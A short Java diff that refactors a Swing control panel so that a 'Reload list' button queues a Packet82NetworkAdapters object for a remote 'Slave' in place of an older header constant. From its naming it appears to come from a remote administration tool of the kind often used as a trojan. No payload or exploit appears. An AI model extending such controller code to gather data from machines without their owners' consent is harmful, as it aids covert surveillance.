@@ -14,7 +14,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet82NetworkAdapters;
 
 @SuppressWarnings("serial")
 public class PanelControlAdapters extends PanelControlParent {
@@ -38,7 +38,7 @@ public class PanelControlAdapters extends PanelControlParent {
 		btnReloadList.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				clear();
-				slave.addToSendQueue(OutgoingHeader.LIST_NETWORK_ADAPTERS);
+				slave.addToSendQueue(new Packet82NetworkAdapters());
 			}
 		});
 		
